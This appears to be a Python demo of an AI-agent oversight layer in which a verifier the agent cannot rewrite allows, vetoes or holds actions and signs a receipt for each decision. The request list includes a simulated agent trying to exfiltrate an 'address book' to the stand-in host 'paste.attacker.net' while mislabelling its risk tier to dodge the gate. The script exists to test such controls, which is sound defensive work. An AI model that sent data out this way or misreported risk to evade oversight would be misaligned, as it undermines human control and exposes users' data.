"""M2 demo — the independent verifier-with-veto in action.

Run from os/trust-spine/:

    python demos/m2_verifier_demo.py

A leaf agent submits a sequence of actions through the Trust Kernel. The
verifier (which the agent cannot rewrite) allows the safe ones, VETOES an egress
to a non-allowlisted host, and HOLDS a spend pending the golden-share — and every
decision, including the refusals, leaves a signed receipt.
"""

from __future__ import annotations

import os
import shutil
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(_HERE))

from trust_spine.kernel import ActionRequest, TrustKernel  # noqa: E402
from trust_spine.ledger import Ledger  # noqa: E402
from trust_spine.policy import Policy  # noqa: E402
from trust_spine.signing import pqc_available  # noqa: E402
from trust_spine.verifier import Verifier  # noqa: E402

LEDGER_DIR = os.path.join(_HERE, ".m2-demo-ledger")

# The agent declares this egress as Tier 1 to try to dodge the gate; the verifier
# escalates it to Tier 3 anyway.
REQUESTS = [
    ActionRequest(actor="ceo", action="plan.decompose", inputs={"goal": "research a vendor"}, risk_tier=1),
    ActionRequest(actor="research-leaf", action="fs.write", inputs={"path": "notes.md"}, risk_tier=1,
                  effect=lambda: {"bytes": 512}),
    ActionRequest(actor="research-leaf", action="net.egress", inputs={"query": "vendor pricing"},
                  risk_tier=3, context={"host": "api.anthropic.com"}, effect=lambda: {"status": 200}),
    ActionRequest(actor="research-leaf", action="net.egress", inputs={"exfil": "address book"},
                  risk_tier=1, context={"host": "paste.attacker.net"}, effect=lambda: {"leaked": True}),
    ActionRequest(actor="ceo", action="spend", inputs={"amount": 49.0, "to": "vendor"}, risk_tier=3,
                  effect=lambda: {"charged": True}),
]


def main() -> int:
    if os.path.exists(LEDGER_DIR):
        shutil.rmtree(LEDGER_DIR)
    led = Ledger(LEDGER_DIR)
    # Policy: only the Anthropic API host is allowed for egress.
    verifier = Verifier(Policy(egress_allowlist={"api.anthropic.com"}))
    kernel = TrustKernel(led, verifier)

    alg = "ML-DSA-65" if pqc_available() else "Ed25519"
    print("─" * 76)
    print(f"Trust Spine v0 · M2 verifier-with-veto demo   signing: {alg}")
    print("policy: egress allowlist = {api.anthropic.com}; reserved = {spend, …}")
    print("─" * 76)

    icons = {"allow": "✓ allow ", "veto": "⛔ VETO  ", "pending": "✋ PENDING"}
    for req in REQUESTS:
        res = kernel.submit(req)
        host = req.context.get("host")
        where = f" host={host}" if host else ""
        print(f"  {icons[res.decision]} [{req.actor}] {req.action}{where}  (tier {res.tier})")
        print(f"            ↳ {res.reason}  · receipt {res.receipt_id[:12]}…")

    print("\n" + "─" * 76)
    log = led.verify_log()
    print(f"  whole-log verify: ok={log['ok']}  receipts={log['count']}  root={log['root'][:16]}…")
    print("  Every decision — including the veto and the held spend — is a signed receipt.")
    print("─" * 76)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
